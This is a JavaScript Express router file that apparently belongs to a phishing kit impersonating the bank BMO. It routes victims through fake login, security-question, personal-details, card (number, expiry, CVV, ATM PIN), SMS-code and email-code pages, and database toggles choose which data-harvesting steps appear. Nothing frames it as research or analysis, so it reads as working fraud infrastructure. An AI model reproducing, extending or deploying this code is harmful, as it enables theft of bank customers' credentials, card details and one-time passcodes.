// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/bmo/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/bmo/card/index', { navig: "/bmo/finish", bmo: result.rows[0].data.settings.bmo});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/bmo/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/bmo/sms/index', { navig: "/bmo/loading", error: error});
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/bmo/email/index', { navig: "/bmo/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.bmo).forEach(key => {
            if (result.rows[0].data.settings.bmo[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/bmo/details/index', { navig: "/bmo/finish", bmo: result.rows[0].data.settings.bmo});
        } else {
            res.render('bank/bmo/details/index', { navig: "/bmo/card", bmo: result.rows[0].data.settings.bmo});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.bmo).forEach(key => {
            if (result.rows[0].data.settings.bmo[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/bmo/qst/index', { navig: "/bmo/finish", p_quests: result.rows[0].data.settings.bmo.qa });
            } else {
                res.render('bank/bmo/qst/index', { navig: "/bmo/card", p_quests: result.rows[0].data.settings.bmo.qa });
            }
        } else if (count >= 14) {
            res.render('bank/bmo/qst/index', { navig: "/bmo/finish", p_quests: result.rows[0].data.settings.bmo.qa });
        } else {
            res.render('bank/bmo/qst/index', { navig: "/bmo/details", p_quests: result.rows[0].data.settings.bmo.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.bmo).forEach(key => {
            if (result.rows[0].data.settings.bmo[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.bmo.qa > 0) {
            res.render('bank/bmo/login/index', { navig: "/bmo/qst" });
        } else if (count >= 14) {
            res.render('bank/bmo/login/index', { navig: "/bmo/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/bmo/login/index', { navig: "/bmo/finish" });
                } else {
                    res.render('bank/bmo/login/index', { navig: "/bmo/card" });
                }
            } else {
                res.render('bank/bmo/login/index', { navig: "/bmo/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;